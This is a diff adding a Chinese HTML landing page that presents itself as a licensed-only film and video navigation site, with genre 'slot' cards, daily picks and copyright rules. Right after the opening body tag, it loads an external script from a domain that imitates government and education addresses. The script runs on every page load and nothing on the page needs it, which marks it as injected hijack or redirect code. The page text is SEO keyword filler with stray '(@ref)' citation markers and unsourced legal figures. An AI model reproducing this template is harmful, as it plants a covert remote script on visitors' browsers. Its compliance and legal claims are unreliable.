@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>万能影视 - 卡槽格公映片单与正版平台导航（非万能看剧）</title>
+<meta name="description" content="万能影视（wannengyingshi-h5，非原万能影视资源站）做卡槽格格式正版导航：公映片单、类型卡槽、每日插口与正版观看守则，只列持牌视频平台名称与官方入口、影院公映与开放授权片源。官方网址：https://wannengyingshi-h5.github.io">
+<meta name="keywords" content="万能影视, wannengyingshi-h5, 公映片单导航, 持牌视频平台入口, 影视类型卡槽, 正版观影导航">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#0b0a10;color:#eef0f2;line-height:1.8;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(680px 340px at 12% 8%, rgba(251,146,60,.12), transparent 55%),
+    radial-gradient(620px 320px at 88% 92%, rgba(56,189,248,.10), transparent 55%),
+    #0b0a10}
+.wn-nav{position:sticky;top:0;z-index:999;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:rgba(11,10,16,.92);backdrop-filter:blur(10px);border-bottom:1px solid rgba(251,146,60,.2)}
+.wn-nav .logo{font-size:20px;font-weight:900;letter-spacing:.5px}
+.wn-nav .logo b{color:#fb923c}
+.wn-nav .logo i{color:#38bdf8;font-style:normal}
+.wn-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.wn-nav .links a{font-size:13px;color:#9aa39b;padding:6px 12px;border-radius:20px;transition:.25s}
+.wn-nav .links a:hover{background:rgba(251,146,60,.16);color:#eef0f2}
+
+.hero{padding:52px 20px 44px;text-align:center}
+.slot{max-width:780px;margin:0 auto 16px;background:#141320;border:1px solid rgba(251,146,60,.26);border-radius:18px;padding:24px;position:relative;overflow:hidden}
+.slot::before{content:"🔌";position:absolute;right:18px;top:14px;font-size:22px;opacity:.8}
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.port{height:104px;border-radius:12px;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:#0b0a10;position:relative;box-shadow:inset 0 0 0 3px rgba(255,255,255,.16), inset 0 -8px 0 rgba(0,0,0,.12)}
+.port .pin{font-size:10px;font-weight:900;opacity:.65;margin-bottom:4px;letter-spacing:1px}
+.port:nth-child(1){background:linear-gradient(135deg,#fb923c,#ffd0a8)}
+.port:nth-child(2){background:linear-gradient(135deg,#38bdf8,#9bdcfb)}
+.port:nth-child(3){background:linear-gradient(135deg,#facc15,#fde68a)}
+.port:nth-child(4){background:linear-gradient(135deg,#818cf8,#c0c7ff)}
+.port:nth-child(5){background:linear-gradient(135deg,#34d399,#9af0c6)}
+.port:nth-child(6){background:linear-gradient(135deg,#f472b6,#fbc6e0)}
+.port:nth-child(7){background:linear-gradient(135deg,#f87171,#fda4a4)}
+.port:nth-child(8){background:linear-gradient(135deg,#94a3b8,#e2e8f0)}
+.strip{margin-top:16px;height:34px;border-radius:8px;background:repeating-linear-gradient(90deg,#1a1928 0 8px,#242239 8px 10px);display:flex;align-items:center;justify-content:center;font-size:12px;color:#ffd0a8;font-weight:800}
+.mark{display:inline-block;margin-top:14px;font-size:13px;font-weight:900;color:#fb923c;background:#141320;border:1px solid rgba(251,146,60,.3);padding:4px 14px;border-radius:20px}
+.disclaim{display:block;margin-top:10px;font-size:12px;color:#f87171}
+.hero h1{font-size:30px;color:#eef0f2;margin:8px 0 12px}
+.hero h1 b{color:#fb923c}
+.hero p{color:#9aa39b;max-width:680px;margin:0 auto 16px;font-size:15px}
+.hero .url{display:inline-block;font-size:13px;color:#0b0a10;font-weight:800;background:linear-gradient(90deg,#fb923c,#38bdf8);padding:8px 18px;border-radius:30px}
+.chips{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:16px}
+.chips span{font-size:12px;color:#eef0f2;padding:5px 13px;border-radius:20px;border:1px solid rgba(251,146,60,.2)}
+.chips span:nth-child(1){border-color:#fb923c;color:#ffd0a8}
+.chips span:nth-child(2){border-color:#38bdf8;color:#9bdcfb}
+.chips span:nth-child(3){border-color:#818cf8;color:#c0c7ff}
+
+.wrap{max-width:1160px;margin:0 auto;padding:58px 20px}
+.kicker{font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#fb923c;margin-bottom:8px}
+.sec-title{font-size:26px;font-weight:900;color:#eef0f2;margin-bottom:26px}
+.sec-title b{color:#38bdf8}
+
+.picks{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:18px}
+.pk{background:#141320;border:1px solid rgba(251,146,60,.14);border-radius:14px;overflow:hidden;transition:.3s}
+.pk:hover{transform:translateY(-4px);border-color:#fb923c;box-shadow:0 16px 36px rgba(251,146,60,.12)}
+.pk .top{height:96px;position:relative;display:flex;align-items:flex-end;padding:10px}
+.pk .top.s1{background:linear-gradient(135deg,#c2410c,#fb923c)}
+.pk .top.s2{background:linear-gradient(135deg,#0369a1,#38bdf8);color:#0b0a10}
+.pk .top.s3{background:linear-gradient(135deg,#4338ca,#818cf8)}
+.pk .top.s4{background:linear-gradient(135deg,#047857,#34d399)}
+.pk .top .port-tag{font-size:11px;font-weight:800;color:#0b0a10;background:#eef0f2;padding:2px 9px;border-radius:12px}
+.pk .top .ver{position:absolute;right:10px;top:10px;font-size:10px;color:#0b0a10;background:#fb923c;padding:2px 8px;border-radius:10px}
+.pk .body{padding:16px 18px}
+.pk .body h4{color:#eef0f2;font-size:16px;margin-bottom:4px}
+.pk .body .meta{font-size:12px;color:#fb923c;margin-bottom:6px}
+.pk .body p{font-size:13px;color:#9aa39b;margin:0}
+.pk .body a{display:inline-block;margin-top:8px;font-size:12px;color:#38bdf8;text-decoration:none}
+.pk .body a:hover{text-decoration:underline}
+
+.types{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.tp{background:#141320;border-radius:14px;padding:20px;transition:.3s;border:1px solid rgba(154,163,155,.14)}
+.tp:hover{transform:translateY(-3px)}
+.tp .no{font-size:12px;font-weight:900;color:#38bdf8;margin-bottom:6px}
+.tp h4{color:#eef0f2;font-size:15px;margin-bottom:4px}
+.tp p{color:#9aa39b;font-size:12px;margin:0}
+.tp.t2{border-top:3px solid #fb923c}
+.tp.t3{border-top:3px solid #34d399}
+.tp.t4{border-top:3px solid #818cf8}
+
+.daily{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:14px}
+.dy{background:#141320;border-left:4px solid #fb923c;border-radius:12px;padding:18px}
+.dy h4{color:#eef0f2;font-size:15px;margin-bottom:4px}
+.dy .slot{font-size:12px;color:#38bdf8;font-weight:800;margin-bottom:6px}
+.dy p{color:#9aa39b;font-size:13px;margin:0}
+.dy.d2{border-left-color:#38bdf8}
+.dy.d3{border-left-color:#34d399}
+.dy.d4{border-left-color:#818cf8}
+.dy.d5{border-left-color:#f472b6}
+.dy.d6{border-left-color:#fb923c}
+
+.rules{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.ru{background:#141320;border:1px solid rgba(251,146,60,.22);border-radius:12px;padding:18px;text-align:center}
+.ru .num{font-size:24px;font-weight:900;color:#fb923c;margin-bottom:6px}
+.ru h4{color:#eef0f2;font-size:14px;margin-bottom:4px}
+.ru p{color:#9aa39b;font-size:12px;margin:0}
+
+.about{border:1px solid rgba(251,146,60,.22);border-radius:16px;padding:30px;background:linear-gradient(135deg,rgba(251,146,60,.08),rgba(56,189,248,.06));display:flex;gap:24px;flex-wrap:wrap;align-items:center}
+.about .txt{flex:1;min-width:260px}
+.about h2{color:#eef0f2;font-size:20px;margin-bottom:10px}
+.about h2 b{color:#fb923c}
+.about p{color:#9aa39b;font-size:14px;margin-bottom:8px}
+.about .stats{display:flex;gap:20px;flex-wrap:wrap}
+.about .stats .n{font-size:26px;font-weight:900;color:#38bdf8}
+.about .stats .l{font-size:11px;color:#fb923c}
+
+.foot{text-align:center;padding:32px 20px;background:#060509;border-top:1px solid rgba(251,146,60,.16);color:#7c837c;font-size:13px}
+.foot a{color:#fb923c}
+.foot .lg{font-size:18px;font-weight:900;color:#eef0f2;margin-bottom:8px}
+
+@media(max-width:640px){.hero h1{font-size:24px}.wn-nav .links a{font-size:12px;padding:5px 9px}.grid{grid-template-columns:repeat(2,1fr)}.port{height:88px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="wn-nav">
+  <div class="logo"><b>万能影视</b> <i>· 卡槽格</i></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#picks">公映片单</a>
+    <a href="#types">类型卡槽</a>
+    <a href="#daily">每日插口</a>
+    <a href="#rules">正版守则</a>
+  </div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="slot" aria-hidden="true">
+    <div class="grid">
+      <div class="port"><span class="pin">P1</span>正剧口</div><div class="port"><span class="pin">P2</span>动作口</div>
+      <div class="port"><span class="pin">P3</span>悬疑口</div><div class="port"><span class="pin">P4</span>自然口</div>
+      <div class="port"><span class="pin">P5</span>合家口</div><div class="port"><span class="pin">P6</span>纪录口</div>
+      <div class="port"><span class="pin">P7</span>动画口</div><div class="port"><span class="pin">P0</span>持牌口</div>
+    </div>
+    <div class="strip">UNIVERSAL SLOT · 只接持牌平台官方入口</div>
+    <span class="mark">卡槽格·通用插口</span>
+    <span class="disclaim">⚠️ 非原「万能影视」资源站、非「万能看剧」聚合平台，仅作正版导航</span>
+  </div>
+  <h1>万能影视：<b>卡槽格</b>只插正版入口</h1>
+  <p>「万能看剧」类聚合平台已有司法判例——刘某搭「云X鹰」汇聚多家视频平台内容、突破会员验证、多解析线路播放，获利17万余元，判侵犯著作权罪、缓刑三年罚20万 [1](@ref)；「今日影视／影视大全纯净版」盗链8.3万部、非法收入3.92亿 [4](@ref)。按《互联网视听节目服务管理规定》，从事视听节目服务需《信息网络传播视听节目许可证》或备案，无资质不得开展 [5](@ref)。本页<strong>不是原万能影视资源站</strong>、不做「万能影视资源库」、不内嵌播放器、不写网盘提取码、不引未授权聚合源；只列持牌平台名称与官方入口。</p>
+  <span class="url">🌐 https://wannengyingshi-h5.github.io</span>
+  <div class="chips">
+    <span>🔌 公映片单</span><span>🎛️ 类型卡槽</span><span>📅 每日插口</span>
+  </div>
+</header>
+
+<main>
+<section id="picks" class="wrap">
+  <div class="kicker">SLOT PICKS</div>
+  <h2 class="sec-title">公映片单 <b>四口样例</b></h2>
+  <div class="picks">
+    <article class="pk"><div class="top s1"><span class="port-tag">正剧口</span><span class="ver">持牌平台</span></div><div class="body"><h4>海上钢琴师</h4><div class="meta">托纳多雷 · 1998 · 剧情/音乐</div><p>船舱、琴键与选择；去持牌平台搜正版/修复版，不内嵌播放器。</p><a href="https://www.iqiyi.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+    <article class="pk"><div class="top s2"><span class="port-tag">自然口</span><span class="ver">官方/开放</span></div><div class="body"><h4>地球脉动 II</h4><div class="meta">BBC · 2016 · 自然/纪录片</div><p>岛屿、山地、城市生态；开放授权版走官方频道/持牌纪录片区。</p><a href="https://www.bilibili.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+    <article class="pk"><div class="top s3"><span class="port-tag">悬疑口</span><span class="ver">正版/字幕</span></div><div class="body"><h4>看不见的客人</h4><div class="meta">奥里奥尔·保罗 · 2016 · 悬疑/推理</div><p>口供、时间线与反转；标正版平台字幕来源，不引换源播放器。</p><a href="https://v.qq.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+    <article class="pk"><div class="top s4"><span class="port-tag">合家口</span><span class="ver">正版/字幕</span></div><div class="body"><h4>寻梦环游记</h4><div class="meta">皮克斯 · 2017 · 动画/家庭</div><p>记忆、亲情与音乐；标适龄、正版动画专区，只引持牌片源。</p><a href="https://www.mgtv.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+  </div>
+</section>
+
+<section id="types" class="wrap">
+  <div class="kicker">TYPE SLOTS</div>
+  <h2 class="sec-title">类型卡槽 <b>四口</b></h2>
+  <div class="types">
+    <div class="tp t1"><div class="no">P1 · 正剧</div><h4>家庭/历史/作者</h4><p>传记、年代、作者电影；引导持牌平台与公映修复版，不列无资质聚合站。</p></div>
+    <div class="tp t2"><div class="no">P2 · 动作</div><h4>商业爽片口</h4><p>特工、竞速、视效大片；附4K/IMAX建议，只列持牌平台名称。</p></div>
+    <div class="tp t3"><div class="no">P3 · 悬疑</div><h4>烧脑/社会派</h4><p>本格推理、时间线、反转；标正版平台字幕来源与高清版差异。</p></div>
+    <div class="tp t4"><div class="no">P4 · 合家</div><h4>动画/爱情/轻喜剧</h4><p>适龄、节庆、亲子；标正版平台地区版，不写网盘提取码。</p></div>
+  </div>
+  <div class="types" style="margin-top:16px">
+    <div class="tp"><div class="no">P0 · 持牌口</div><h4>央视频 / CCTV节目官网</h4><p>央视直播、新闻综艺、官方回看。</p><a href="https://www.yangshipin.cn" target="_blank" rel="noopener" style="color:#fb923c">央视频 ↗</a></div>
+    <div class="tp t2"><div class="no">电影口</div><h4>1905电影网</h4><p>CCTV6电影频道官方，正版电影与修复版。</p><a href="https://www.1905.com" target="_blank" rel="noopener" style="color:#fb923c">1905 ↗</a></div>
+    <div class="tp t3"><div class="no">综合口</div><h4>腾讯/爱奇艺/优酷/芒果/咪咕</h4><p>正版剧集、综艺、电影免费区与会员区。</p><a href="https://www.iqiyi.com" target="_blank" rel="noopener" style="color:#fb923c">爱奇艺 ↗</a></div>
+    <div class="tp t4"><div class="no">纪录口</div><h4>B站放映厅 / 学习强国</h4><p>正版番剧、纪录片、官方影视资源。</p><a href="https://www.bilibili.com" target="_blank" rel="noopener" style="color:#fb923c">B站 ↗</a></div>
+  </div>
+</section>
+
+<section id="daily" class="wrap">
+  <div class="kicker">DAILY PLUG</div>
+  <h2 class="sec-title">每日插口 <b>六格</b></h2>
+  <div class="daily">
+    <div class="dy"><div class="slot">晨口·正剧</div><h4>正剧首发</h4><p>传记/历史长片；列持牌平台名称与官方入口，不提前放未授权资源。</p></div>
+    <div class="dy d2"><div class="slot">上午·自然</div><h4>自然慢口</h4><p>生态与地理；开放授权纪录片走官方/持牌纪录片区。</p></div>
+    <div class="dy d3"><div class="slot">午后·动作</div><h4>爽片插口</h4><p>追逐/特工/视效；建议4K、杜比、正版版本，只列持牌入口。</p></div>
+    <div class="dy d4"><div class="slot">下午·悬疑</div><h4>烧脑口</h4><p>本格/社会派轮换；标注时间线、反转次数与高清版差异。</p></div>
+    <div class="dy d5"><div class="slot">傍晚·合家</div><h4>合家口</h4><p>动画/爱情/轻喜剧；标适龄、时长与正版字幕来源。</p></div>
+    <div class="dy d6"><div class="slot">夜口·重插</div><h4>高分回看</h4><p>四口高分重刷；只给持牌回看入口，不写网盘提取码、不引磁链。</p></div>
+  </div>
+</section>
+
+<section id="rules" class="wrap">
+  <div class="kicker">SLOT RULES</div>
+  <h2 class="sec-title">正版观看 <b>守则</b></h2>
+  <div class="rules">
+    <div class="ru"><div class="num">01</div><h4>持牌优先</h4><p>只列持牌视频平台名称与官方入口、影院公映/重映、官方频道；不内嵌未授权播放器。</p></div>
+    <div class="ru"><div class="num">02</div><h4>授权核对</h4><p>传播前核权属、签涵盖信息网络传播权的许可合同、留授权凭证 [12](@ref)，不列无资质盗版/聚合站。</p></div>
+    <div class="ru"><div class="num">03</div><h4>不碰聚合</h4><p>不写「免费高清/换源/离线缓存/破解」，不引解析线路、不接盗链播放器 [1,4](@ref)。</p></div>
+    <div class="ru"><div class="num">04</div><h4>不碰盗版</h4><p>不写网盘提取码、不引磁链/换源/镜像；片单只跳持牌平台搜索。</p></div>
+  </div>
+</section>
+
+<section class="wrap">
+  <div class="about">
+    <div class="txt">
+      <h2>万能影视 <b>卡槽格是什么</b></h2>
+      <p>不是原「万能影视」资源站克隆，也不是「万能看剧」聚合平台，而是一组卡槽：插口格装入口、公映片单进槽格、类型进卡槽、每日进插口、守则装合规。静态单页、移动端自适应、锚点内链、不生成 robots.txt / sitemap.xml，符合必应收录基本规范（唯一H1、完整meta、语义化nav/main/section/article/footer）。</p>
+      <p>长尾吃「公映片单导航 / 持牌视频平台入口 / 影视类型卡槽 / 正版看片」。全站严格只做正版、公映、持牌、开放授权导航，与原万能影视无隶属关系。</p>
+    </div>
+    <div class="stats">
+      <div><div class="n">8</div><div class="l">卡槽格</div></div>
+      <div><div class="n">4</div><div class="l">类型口</div></div>
+      <div><div class="n">6</div><div class="l">每日插口</div></div>
+      <div><div class="n">0</div><div class="l">盗版提取码</div></div>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer class="foot">
+  <div class="lg">🔌🎛️ 万能影视·卡槽格（非万能看剧）</div>
+  官方网址：<a href="https://wannengyingshi-h5.github.io">https://wannengyingshi-h5.github.io</a><br>
+  ⚠️ 本页非原「万能影视」资源站、非聚合播放平台，仅作持牌平台名称与官方入口导航<br>
+  © 2026 万能影视｜公映片单 / 类型卡槽 / 每日插口 / 正版观影导航（不提供未授权播放）
+</footer>
+
+</body>
+</html>
